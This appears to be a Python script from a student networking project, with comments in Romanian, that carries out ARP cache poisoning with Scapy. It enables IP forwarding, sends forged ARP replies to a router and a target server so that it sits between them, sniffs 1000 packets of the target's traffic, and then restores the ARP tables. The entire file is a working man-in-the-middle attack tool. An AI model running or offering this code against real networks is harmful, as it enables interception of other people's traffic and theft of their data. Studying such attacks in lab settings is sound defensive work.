# inspirat din indicatii proiect : 
# https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242

from scapy.all import *
import os
import signal
import sys
import threading
import time


gatewayIP = "198.7.0.1" # IP router 
targetIP = "198.7.0.2" # IP server (tinta)
packet_count = 1000 # cate pachete capturam 
conf.iface = "eth0" # folosim interfata Ethernet0     
conf.verb = 0 # dezactiveaza msj de log scapy            


# trimite o cerere ARP catre o adr IP si primeste raspunsul cu MAC-ul asociat
def obtineMAC(ip_address):
    raspuns, faraRaspuns = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=5)
    for trimis, primit in raspuns:
        return primit[ARP].hwsrc # adr MAC a masinii care a rapsuns
    return None



# trimite pachete ARP corecte
# dezactiveaza ip forwarding 
# nu lasam reteua stricata dupa ce am terminat atacul

def restore_network(gatewayIP, gatewayMAC, targetIP, targetMAC):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gatewayIP, hwsrc=targetMAC, psrc=targetIP), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=targetIP, hwsrc=gatewayMAC, psrc=gatewayIP), count=5)
    print("[] DEZACTIVARE -> IP forwarding")
    os.system("sysctl -w net.ipv4.ip_forward=0")
    os.kill(os.getpid(), signal.SIGTERM)



# trimite pachete ARP fake
# se "sugereaza" routerului ca middle=server si serverului ca middle=router

def atacARP(gatewayIP, gatewayMAC, targetIP, targetMAC):
    print("[] ARP -> pornit")
    try:
        while True:
            send(ARP(op=2, pdst=gatewayIP, hwdst=gatewayMAC, psrc=targetIP))
            send(ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=gatewayIP))
            time.sleep(2)  # trimitem pachete la 2 secunde distanta
    except KeyboardInterrupt:
        print("\n[] ARP -> oprit")
        restore_network(gatewayIP, gatewayMAC, targetIP, targetMAC)




# mesaje de start etc...
print("[] ACTIVARE -> IP forwarding")
os.system("sysctl -w net.ipv4.ip_forward=1")
print(f"[] OK -> router ip = {gatewayIP}")
print(f"[] OK -> server ip = {targetIP}")



# obtinem MAC pentru gatwway (router)
gatewayMAC = obtineMAC(gatewayIP)
if gatewayMAC is None:
    print("[!] EROARE -> mac router")
    sys.exit(1)
print(f"[] OK -> mac router = {gatewayMAC}")


# obtinem MAC pentru server (tinta)
targetMAC = obtineMAC(targetIP)
if targetMAC is None:
    print("[] EROARE -> mac server")
    sys.exit(1)
print(f"[] OK -> mac server = {targetMAC}")



# porntim un (alt) thread pentru atac ARP
poison_thread = threading.Thread(target=atacARP, args=(gatewayIP, gatewayMAC, targetIP, targetMAC))
poison_thread.start()



# capturam pachetele de la serverul tinta
try:
    sniff_filter = f"ip host {targetIP}" # captureaza traficul in spre / din spre target
    print(f"[] OK -> (pachete: {packet_count}), filtru: {sniff_filter}")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    print("\n[] ARP -> oprit + restaurare")
    restore_network(gatewayIP, gatewayMAC, targetIP, targetMAC)

except KeyboardInterrupt:
    print("\n[] ARP -> oprit + restaurare")
    restore_network(gatewayIP, gatewayMAC, targetIP, targetMAC)
    sys.exit(0)
    
    
 
